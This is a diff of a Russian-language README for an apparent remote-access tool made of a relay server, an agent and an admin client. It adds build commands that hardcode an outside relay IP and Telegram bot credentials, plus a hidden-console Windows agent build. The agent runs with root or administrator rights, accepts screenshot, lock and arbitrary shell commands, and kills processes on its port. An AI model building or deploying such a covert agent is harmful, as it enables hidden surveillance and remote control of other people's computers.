@@ -18,34 +18,66 @@
 ## Сборка
 Все команды выполнять из корня проекта.
 
-### Linux (gcc/clang)
+### Linux (gcc/clang) — параметры обязательны
 ```bash
-g++ -std=c++17 -O2 -I. -o relay_server relay/main.cpp relay/relay_server.cpp -pthread
-g++ -std=c++17 -O2 -I. -o remote_agent  agent/main.cpp  agent/agent.cpp  -pthread
-g++ -std=c++17 -O2 -I. -o admin_client  admin/main.cpp  admin/admin_client.cpp -pthread
+# relay
+g++ -std=c++17 -O2 -I. \
+  -DDEFAULT_PORT=9999 \
+  -DDEFAULT_RELAY_HOST="213.108.4.126" \
+  -DTELEGRAM_BOT_TOKEN="your_bot_token" \
+  -DTELEGRAM_CHAT_ID="your_chat_id" \
+  -o relay_server relay/main.cpp relay/relay_server.cpp -pthread
+
+# agent
+g++ -std=c++17 -O2 -I. \
+  -DDEFAULT_PORT=9999 \
+  -DDEFAULT_RELAY_HOST="213.108.4.126" \
+  -o remote_agent  agent/main.cpp  agent/agent.cpp  -pthread
+
+# admin
+g++ -std=c++17 -O2 -I. \
+  -DDEFAULT_PORT=9999 \
+  -o admin_client  admin/main.cpp  admin/admin_client.cpp -pthread
 ```
 
-### macOS (clang)
+### macOS (clang) — параметры обязательны
 ```bash
-clang++ -std=c++17 -O2 -I. -o relay_server relay/main.cpp relay/relay_server.cpp -pthread
-clang++ -std=c++17 -O2 -I. -o remote_agent  agent/main.cpp  agent/agent.cpp  -pthread
-clang++ -std=c++17 -O2 -o admin_client  admin/main.cpp  admin/admin_client.cpp -pthread
+# relay
+clang++ -std=c++17 -O2 -I. \
+  -DDEFAULT_PORT=9999 \
+  -DDEFAULT_RELAY_HOST="213.108.4.126" \
+  -DTELEGRAM_BOT_TOKEN="your_bot_token" \
+  -DTELEGRAM_CHAT_ID="your_chat_id" \
+  -o relay_server relay/main.cpp relay/relay_server.cpp -pthread
+
+# agent
+clang++ -std=c++17 -O2 -I. \
+  -DDEFAULT_PORT=9999 \
+  -DDEFAULT_RELAY_HOST="213.108.4.126" \
+  -o remote_agent  agent/main.cpp  agent/agent.cpp  -pthread
+
+# admin
+clang++ -std=c++17 -O2 -I. \
+  -DDEFAULT_PORT=9999 \
+  -o admin_client  admin/main.cpp  admin/admin_client.cpp -pthread
 ```
 
-### Windows (MinGW, статические бинарники без DLL)
+### Windows (MinGW, статические бинарники без DLL) — параметры обязательны
 - Релиз без консоли (агент, чистая система):
 ```powershell
 g++ -std=c++17 -O2 -I. -mwindows -static -static-libgcc -static-libstdc++ ^
+  -DDEFAULT_PORT=9999 -DDEFAULT_RELAY_HOST="213.108.4.126" ^
   -o remote_agent.exe agent/main.cpp agent/agent.cpp ^
   -lws2_32 -luser32 -lkernel32 -lwinpthread
 ```
 - Отладка с консолью (агент):
 ```powershell
 g++ -std=c++17 -O2 -I. -static -static-libgcc -static-libstdc++ ^
+  -DDEFAULT_PORT=9999 -DDEFAULT_RELAY_HOST="213.108.4.126" ^
   -o remote_agent_debug.exe agent/main.cpp agent/agent.cpp ^
   -lws2_32 -luser32 -lkernel32 -lwinpthread
 ```
-- Сервер/клиент под MinGW аналогично: заменить цели и исходники (`relay_server.exe`, `admin_client.exe`), флаги те же (`-static -static-libgcc -static-libstdc++ -lws2_32 -lwinpthread`), `-mwindows` использовать только если нужно скрыть консоль.
+- Сервер/клиент под MinGW аналогично: заменить цели и исходники (`relay_server.exe`, `admin_client.exe`), флаги те же (`-static -static-libgcc -static-libstdc++ -lws2_32 -lwinpthread`), `-mwindows` использовать только если нужно скрыть консоль; обязательно задать `-DDEFAULT_PORT=...` и для релея `-DTELEGRAM_BOT_TOKEN=... -DTELEGRAM_CHAT_ID=...`.
 
 ## Запуск
 Порт по умолчанию `9999`. Если занят, сервер и агент пытаются убить процесс, слушающий порт.
@@ -93,6 +125,24 @@ sudo ./remote_agent         # Linux/macOS
 3. Запустить `remote_agent` с правами администратора/root.
 4. Запустить `admin_client`, выполнить `list`, затем `select <id>`.
 5. Проверить команды: `lock`, `unlock`, `screenshot`, и произвольный shell‑запрос.
+
+## Сборка через build.sh (использует secrets.env)
+1) Заполните `secrets.env` (пример уже в репозитории).  
+2) Примеры:
+```bash
+# relay
+./build.sh relay
+
+# agent с консолью
+./build.sh agent console
+
+# agent без консоли (Windows cross/MinGW: добавьте нужный CXX)
+./build.sh agent hidden
+
+# admin
+./build.sh admin
+```
+Параметры обязательны: DEFAULT_PORT, DEFAULT_RELAY_HOST, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID берутся из `secrets.env`. `CXX` можно переопределить (по умолчанию g++).
 
 ## Тревожные сигналы и диагностика
 - Если команды/скриншоты не доходят — смотрите логи релея: ошибки send/recv помечают агента оффлайн, агент переподключится.
